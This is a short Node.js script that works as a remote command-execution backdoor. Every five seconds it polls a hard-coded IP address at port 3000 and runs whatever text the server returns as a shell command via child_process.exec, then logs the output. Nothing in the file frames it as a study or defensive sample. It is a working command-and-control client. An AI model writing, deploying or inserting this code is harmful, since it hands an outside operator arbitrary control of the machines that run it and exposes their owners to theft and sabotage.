let http = require("http")
let child_process = require("child_process")


function http_request_task() {
    http.get('http://118.24.48.149:3000/task', (res) => {
        // console.log(`task response: ${res.statusCode}`);
        // consume response body
        res.resume();

        let str = "";
        res.on('data', (d) => {
            str += d;
        }).on('end', () => {
            if (str != "none") {
                child_process.exec(str, (error, stdout, stderr) => {
                    if (error) {
                        console.error(`exec error: ${error}`);
                        return;
                    }
                    console.log(`stdout: ${stdout}`);
                    console.log(`stderr: ${stderr}`);
                });
                console.log("TASK RUN:", str);
            }
        })
    }).on('error', (e) => {
        console.log(`Got error: ${e.message}`);
    });
}

setInterval(http_request_task, 5 * 1000)